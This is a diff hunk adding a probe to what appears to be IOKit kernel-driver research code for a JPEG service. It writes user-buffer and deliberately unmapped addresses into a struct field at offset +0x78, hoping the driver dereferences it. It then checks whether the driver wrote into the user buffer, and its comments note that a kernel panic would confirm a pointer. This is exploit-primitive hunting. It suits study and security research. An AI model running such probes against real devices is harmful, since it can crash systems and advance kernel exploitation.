@@ -1025,6 +1025,56 @@ NSString *ModJpegMethods(void) {
         free(ubuf);
     }
 
+    // ---- sel5 POINTER PROBE: the value probe proved +0x58 is a 32-bit field
+    //      (every value below 2^32 works; 0x100000000 and the user address are
+    //      rejected) while +0x78 accepts ARBITRARY 64-bit values including a
+    //      user address, with kr=0.  A field that takes a full 64-bit user
+    //      address is a pointer candidate.  Test it properly this time: point
+    //      it at our pattern buffer, let the async completion LAND (drain the
+    //      notification) and only then check whether the driver touched the
+    //      buffer - and try unmapped addresses to see whether it dereferences
+    //      the pointer at all.  A panic on an unmapped value would name the
+    //      field as a pointer outright. ----
+    {
+        const uint32_t SLOT = 8, BASE = (uint32_t)sizeof(RSJpegIn);
+        uint8_t *ubuf = (uint8_t *)malloc(0x1000);
+        uint64_t cands[8];
+        int nc = 0;
+        uint64_t uaddr = ubuf ? (uint64_t)(uintptr_t)ubuf : 0;
+        if (uaddr) { cands[nc++] = uaddr; cands[nc++] = uaddr + 0x800; }
+        cands[nc++] = 0x0000414141414141ull;   // clearly unmapped
+        cands[nc++] = 0x0000000deadbeefull;
+        cands[nc++] = 0xffffffffffffffffull;
+        AveLog(S(@"[jpegmethods] pointer probe on +0x78, %d candidates (buffer %#llx)", nc, uaddr));
+        for (int i = 0; i < nc; i++) {
+            uint8_t *big = (uint8_t *)malloc(0x1000);
+            uint8_t *bigo = (uint8_t *)malloc(0x1000);
+            if (!big || !bigo) { free(big); free(bigo); break; }
+            memset(big, 0, 0x1000);
+            memset(bigo, 0, 0x1000);
+            if (ubuf) memset(ubuf, 0x41, 0x1000);      // fresh pattern each round
+            rs_jm_fill((RSJpegIn *)big, srcID, dstID, W, H, 0, 0x6161);
+            memcpy(big + BASE + 0x20, &cands[i], SLOT);   // +0x78 = candidate
+            size_t os = 0x1000;
+            kern_return_t kr = IOConnectCallStructMethod(conn, 5, big, 0x1000, bigo, &os);
+            AveLog(S(@"[jpegmethods] ptr +0x78 = %#018llx -> kr=%#x", cands[i], kr));
+            rs_jm_drain(notify, S(@"ptr %#llx", cands[i]));  // let the completion land
+            if (ubuf && kr == KERN_SUCCESS) {
+                int changed = 0;
+                for (uint32_t k = 0; k < 0x1000; k++)
+                    if (ubuf[k] != 0x41) { changed = 1; break; }
+                if (changed) {
+                    AveLog(S(@"[jpegmethods] *** DRIVER WROTE INTO OUR USER BUFFER (ptr +0x78 = %#llx) ***",
+                             cands[i]));
+                    rs_jm_dump(@"userbuf", ubuf, 0x1000);
+                }
+            }
+            free(big);
+            free(bigo);
+        }
+        free(ubuf);
+    }
+
     IOServiceClose(conn);
     CFRelease(src); CFRelease(dst); CFRelease(encSrc); CFRelease(encDst);
     IOObjectRelease(svc);
